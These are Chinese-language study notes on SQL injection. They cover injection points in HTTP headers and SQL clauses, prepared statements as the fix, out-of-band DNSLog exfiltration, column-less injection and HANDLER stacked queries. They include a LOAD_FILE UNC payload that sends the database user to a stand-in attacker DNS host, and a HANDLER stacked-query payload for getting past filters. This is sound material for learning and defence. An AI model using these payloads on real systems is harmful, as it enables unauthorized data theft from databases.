# 注入点查找方法

## 从web请求考虑的注入(HTTP 头部注入)

### GET型注入点
形如：
![](62eb15f74e352b0a20790549d9af5a79_720.jpg)

### POST型注入点
形如：
![](a34dcf2900fabd07fa0814b0f87b9ec5_720.jpg)

### User-Agent型注入点
攻击者通过篡改 HTTP 请求头中的 `User-Agent` 字段，将恶意 SQL 代码注入到后端数据库查询中，从而达到窃取数据、绕过验证甚至控制服务器的目的

很多开发者在编写代码时，潜意识里认为 `GET` 和 `POST` 参数来自用户输入，因此会做过滤或参数化；但容易误认为 HTTP 头部（如 `User-Agent`、`Referer`、`X-Forwarded-For`）是由浏览器底层自动生成的“可信元数据”

- **事实：** 客户端发送的所有 HTTP 请求头均可被攻击者使用代理工具（如 Burp Suite、Postman、Python 脚本）任意篡改和伪造

User-Agent 注入通常出现在**后台日志记录与统计**相关的业务中，绝大多数触发点为 `INSERT` 或 `UPDATE` 语句

如：
- **登录/操作日志审计**
- **访客流量与行为分析（PV/UV）**
- **设备信任与多端会话管理**

如：
![](b88205a4a36aedcf7184edb49999082d_720.jpg)

### Cookie型注入
攻击者将恶意的 SQL 语句片段写入 HTTP 请求头中的 `Cookie` 字段，后端服务器在提取 Cookie 内容后，未经严格过滤或参数化转义，直接将其拼接进 SQL 语句并送入数据库执行所引发的安全漏洞

==(其基本攻击思路与User-Agent型注入思路相类似)==

Cookie 型注入常出现在依赖客户端 Cookie 维持状态或执行快速查询的功能点中
如：
- **“记住密码 / 自动登录”功能**
- **临时身份与用户画像追踪**
- **购物车 / 浏览足迹**
- **二次编码处理场景**

如：
![](fb919a518187d7c79d8780e05002a78e_720.jpg)


### 补：注入点修复方法之——预编译

**实现“代码”与“数据”的物理隔离，使用户输入无法篡改 SQL 的语法解析树**

预编译将 SQL 的解析与执行拆分成了两个独立的阶段：

1. 阶段一：SQL 模板解析与执行树固化
![](Pasted%20image%2020260817123105.png)
2. 参数独立绑定与执行（Execute）
![](Pasted%20image%2020260817123132.png)

如：
![](98a7998dc7ed5d8ad3587c79b70494ae_720.jpg)

#### 预编译缺陷
预编译并非万能药，**占位符只能替代“字面值（Literal Data）”，不能替代“SQL 语法标识符”**

![](Pasted%20image%2020260817123536.png)



## 从SQL语句考虑注入点

### select-field中的注入点（列/字段注入）
**`SELECT` 字段位置（Select-Field / Column List）注入**是指攻击者的输入被拼接在 SQL 语句的查询结果字段（投影列）位置

常见注入场景与上下文分类:
1. 裸字段名 / 动态列名拼接（无引号包裹）
	常见于==前端允许自定义展示列、动态报表导出或 API 字段筛选==（如 `?fields=id,username`）
2. 字符串常量 / 别名拼接（被单/双引号包裹）
	常见于系统为==前端硬编码固定标签、常量或动态别名==
3. 函数参数内部拼接
	常见于==聚合函数、格式化函数或加密函数内部==



如：
![](b5cb8337df6c7a38957f9cd6edc911d0_720.jpg)


==其典型的原始语句形式通常为：==
```
SELECT [注入点] FROM users WHERE id = 1;
-- 或者包含多个字段：
SELECT id, [注入点], email FROM users;
```

### select-table中的注入点

**`SELECT` 表名位置（From-Table / Table Name）注入**是指攻击者的输入被后端程序直接拼接在 SQL 语句的 `FROM` 或 `JOIN` 子句所指定的表名位置

==其典型的原始语句形式通常为：==
```
SELECT id, username, email FROM [注入点] WHERE status = 1;
-- 或多表关联场景：
SELECT a.id, b.detail FROM main_table a LEFT JOIN [注入点] ON a.id = b.aid;
```


常见业务场景
1. **分库分表 / 按时间分表查询**
2. **多租户数据隔离系统**
3. **动态报表 / 导出与统计中心**
4. **多表关联动态 JOIN**

如：
![](7005cff47ab7a10bfa4489163d569569_720.jpg)


### select-where和having中的注入点
`HAVING` 子句通常出现在包含聚合统计、分组报表的复杂查询中；`where`关键字无法与聚合函数一起使用

==其典型的原始语句形式通常为：==
```
-- 场景 A：数值聚合比较注入
SELECT department, COUNT(*) as total FROM employees GROUP BY department HAVING total > {input}(注入点);

-- 场景 B：字符型分组过滤
SELECT role, AVG(salary) FROM users GROUP BY role HAVING role = '{input}(注入点)';
```

如：
![](8fbb3b1bf26a631db6571b5dd0fdc7f4_720.jpg)


### select-order by和group by中的注入点

1. order-by注入点

==其典型的原始语句形式通常为：==
```
-- 常见注入上下文：
SELECT id, username, score FROM users ORDER BY [注入点];
-- 或排序方向拼接：
SELECT id, username, score FROM users ORDER BY id [注入点];
```

2. group by注入点

==其典型的原始语句形式通常为：==
```
-- 常见业务 SQL：
SELECT role, COUNT(*) FROM users GROUP BY [注入点];
```

如：
![](17117fed4ae25b8df46668d7f7731669_720.jpg)


### select-limit中的注入点

**`SELECT` 分页限制位置（`LIMIT` / `OFFSET`）注入**是指攻击者的输入被拼接到 SQL 语句末尾用于控制返回结果行数或偏移量的子句中

==其典型的原始语句形式通常为：==
```
-- 场景 A：MySQL / SQLite 双参数分页（偏移量, 行数）
SELECT id, title, content FROM articles ORDER BY id DESC LIMIT [offset注入点], [size注入点];

-- 场景 B：PostgreSQL / SQLite 标准语法
SELECT id, username FROM users LIMIT [size注入点] OFFSET [offset注入点];

-- 场景 C：SQL Server 2012+ 新版分页
SELECT id, name FROM users ORDER BY id OFFSET [offset注入点] ROWS FETCH NEXT [size注入点] ROWS ONLY;
```

#### 经典 `PROCEDURE ANALYSE()` 报错/盲注==（MySQL 5.5 ~ 5.7）==

在 MySQL 5.x 中，`LIMIT` 子句后允许接 `PROCEDURE ANALYSE()` 执行过程分析。攻击者可借此植入报错函数或延时函数

==`PROCEDURE ANALYSE()` 在 MySQL 5.7.18 中被标记废弃，在 **MySQL 8.0 中已被彻底移除**==





如：
![](796e85fa9b9a56d75894d03a8fefe57e_720.jpg)


### insert中的注入
 **`INSERT` 写入型注入**是指攻击者的恶意输入被拼接到 SQL 的插入语句中。与 `SELECT` 只读查询不同，`INSERT` 语句会**直接修改数据库内容、写入持久化脏数据**

==该注入点常见于**用户注册、发布文章/留言、商品下单、系统日志采集、工单提交**等涉及数据新增的业务功能中==

==其典型的原始语句形式通常为：==
```
-- 字符型参数（带单引号）
INSERT INTO users (username, password, email) VALUES ('{input_user}(注入点)', '{input_pass}(注入点)', '{input_email}(注入点)');

-- 数值型与字符型混合
INSERT INTO logs (user_id, action, ip, create_time) VALUES ({user_id}, '{input_action}(注入点)', '{input_ip}(注入点)', NOW());
```

如：
![](64ae824e539769ae3deb10898a8511a4_720.jpg)


### UPDATE中的注入
**`UPDATE` 写入型注入**是指攻击者的恶意输入被拼接到 SQL 的更新语句中。与 `SELECT` 查询不同，`UPDATE` 属于**数据变更（DML）操作**

攻击者不仅可以==**窃取敏感数据**==，还能==**越权篡改任意字段（如直接将普通账号改为超级管理员）**，甚至在注释或破坏 `WHERE` 条件时造成**全表数据被恶意覆盖清空**==的灾难性后果


常见业务场景与注入上下文

`UPDATE` 注入==常见于**修改个人资料、重置密码、修改收货地址、订单状态流转、商品信息编辑、积分/余额结算==**等功能
1. `SET` 子句字段值拼接（最常见）
2. `WHERE` 条件子句拼接
3. 动态 `SET` 字段名拼接（动态表单/配置场景）


==其典型的原始语句形式通常为：==
```
-- 字符型字段拼接
UPDATE users SET email = '{input_email}'(注入点), nickname = 'test'(注入点) WHERE id = 1;

-- 多字段连续拼接
UPDATE users SET bio = '{input_bio}'(注入点), age = {input_age}(注入点) WHERE id = 1;
```

如：
![700](eb027d94f0f70790b1d2dd6e3bce389a_720.jpg)




# 补：DNSserver带外查询（SQLi OOB）注入方法
**OOB（Out-of-Band，带外）SQL 注入**是一种突破传统盲注瓶颈的注入技术。在无回显且无法通过报错获取信息的黑盒场景下

#### OOB-DNSLog型SQL注入

利用目标数据库内置的网络/文件操作函数，强行让数据库服务器发起 DNS 域名解析请求。攻击者将查询结果（如密码、版本号）作为子域名前缀拼接入目标域名，从而在自建的权威 DNS 服务器或 DNSLog 平台上直接捕获敏感数据

![](3ba57f1a40f86be7c3d17e224d36416d_720.jpg)

工作原理图：
![](Pasted%20image%2020260818143010.png)

##### load_file函数介绍
MySQL 的一个内置函数，==用于读取服务器上的文件内容并将其作为字符串返回==

- 语法：
```
SELECT LOAD_FILE(</path/to/file>);
```


使用限制条件
为了安全起见，MySQL 对 `LOAD_FILE()` 设定了严格的限制：

- **文件位置**：文件必须位于服务器的主机上。 [[1](https://www.pweb123.com/html/Database/1176.html)]
- **路径完整**：必须提供文件的完整绝对路径。
- **权限控制**：执行的用户必须拥有 `FILE` 权限。
- **安全目录限制**：受 `secure_file_priv` 系统变量影响：
    - 若值为 `NULL`，完全禁止读取。
    - 若值为某个指定目录，则只能读取该目录下的文件。
    - 若值为空（无限制），则可读取服务器上当前数据库用户有权限访问的任意文件。 [[1](https://www.anquanke.com/post/id/235236), 
    [2](https://modelers.csdn.net/69a7c7f57bbde9200b9d80df.html)]
- **文件大小限制**：文件大小不能超过 `max_allowed_packet` 变量设置的最大值


#### OOB-UNC路径
**UNC（Universal Naming Convention，通用命名规范 / 统一命名约定）** 是一种在计算机网络（尤其是 Windows 与 SMB/CIFS 协议生态）中用于定位共享网络资源的标准化路径格式

通过 UNC 路径，用户或程序无需先将远程共享文件夹映射为本地驱动器盘符（如 `Z:` 盘），即可直接跨网络访问文件、目录、打印机或命名管道

标准 UNC 路径的格式如下：
```
\\<主机名或IP地址>\<共享名称>\<子目录或文件名>
```


==其典型的原始语句形式通常为：==
```
SELECT LOAD_FILE(
  CONCAT('\\\\'(UNC 前缀), (SELECT HEX(user())) (注入点), '.attacker.dnslog.cn\\(任意共享名)' (域名后缀))
);
```

![](2c438b6cb495386df861650ece37ddc0_720.jpg)

![](d8ba36cce3089cde598154a03d7cb769_720.jpg)


# 补：无列名注入
攻击者在==**已知表名但未知列名**的情况下，就可以利用“无列名注入”技术提取数据==

![](228531c6b44ff0fc9dafe72ec77da503_720.jpg)

==核心应用场景==
1. **WAF 拦截了元数据查询**：
过滤了 `information_schema`、`sys.schema_auto_increment_columns` 等系统视图
2. **只拿到表名，拿不到列名**：
例如通过报错、猜测或仅有的 `sys.schema_table_statistics` 拿到了表名，但列名未知
3. **注入点支持联合查询（Union）或布尔盲注（Blind）**

无列名注入主要分为两大流派：**有回显时的“别名构造法”与** **无回显时的“元组比较法（盲注）”**

### 用别名外带数据(适用于有回显/联合注入)
利用 `UNION SELECT` 创建一个派生表（子查询）。在 MySQL 中，`UNION SELECT` 的结果集字段名默认继承自**第一个 `SELECT` 子句**

==其典型的原始语句形式通常为：==
```
-- 提取 flag 表中的第 2 列数据
SELECT `2` FROM (SELECT 1, 2 UNION SELECT * FROM flag)(注入点) AS a;
```

![](bf90ff66b0270ebd651cc444c108ce9c_720.jpg)




# handeler语法注入

### handeler核心语法与步骤
`HANDLER` 是 MySQL 提供的特有语法，用于绕过 SQL 优化器，直接访问底层存储引擎的接口

- **与 `SELECT` 的区别**：`SELECT` 是标准的 SQL 查询语句，支持复杂的条件、聚合与联表；而 `HANDLER` 相当于一条“指针”，以类似于游标的方式一行一行地直接读取表中的原始记录。
- **最大优势**：**全过程完全不需要出现 `SELECT` 关键字**，且不需要提前知道列名（会自动返回整行数据）。


- 语法：
1. **打开表**：  
`HANDLER <tbl_name> OPEN AS <别名>;`
					    (别名可选)

2. **读取数据**：  
`HANDLER <tbl_name> READ <FIRST>/<NEXT>/<PREV>/<LAST> WHERE <condition> <LIMIT off, count>;`
													(可选参数)                 (可选参数)

3. **通过索引读取：**
`HANDLER <tbl_name> READ <index_name> = / <= / >= / < / > (<value1>, <value2>);`

4. **关闭表**：  
`HANDLER <tbl_name> CLOSE;`


### handeler原理
**`HANDLER` 语法注入**是 MySQL / MariaDB 数据库中一种非常经典的 SQL 注入利用技巧。

当目标环境存在**堆叠注入（Stacked Queries）**，但关键字 **`SELECT`、`UNION` 等被 WAF 严格拦截或黑名单过滤**时，攻击者可以使用 `HANDLER` 语句绕过过滤，直接读取数据表中的内容

==典型应用场景==
1. **堆叠注入可用**：
PHP 使用了支持多语句执行的函数（如 `mysqli_multi_query` 或 PDO 开启了 `PDO::MYSQL_ATTR_MULTI_STATEMENTS`）
2. **`SELECT` 被彻底过滤**：
过滤了 `select`、`union`、`where`、`information_schema` 等，导致无法通过常规联合查询或报错盲注提取数据
3. **已知表名**：
已经通过 `show tables;` 获得了表名

==其典型的原始语句形式通常为：==
```
?id=1'; HANDLER flag OPEN; HANDLER flag READ FIRST; HANDLER flag CLOSE(注入点); --+
```





## 判断注入点是否存在技巧

### 插入非预期字符
通过破坏原有 SQL 语句的语法结构，观察应用是否抛出数据库原生报错或异常 HTTP 状态码（如 500）
如：
![](6bad1efda5580839523da8d73a6f13e8_720.jpg)
单、双引号和反斜杠

### 插入SQL语句
构造插入相应的SQL语句来判断

如：
![](fb7fa98116adb6d214afac334aa34681_720.jpg)


### 插入注释符
(同属于“插入非预期字符”判断一类)

如：
![](e02f82919d2c973104b201f2917be149_720.jpg)


### 使用自动化工具

如：SQLMAP


[SQL注入(4)_进阶1](SQL注入(4)_进阶1.md)

























































































































































































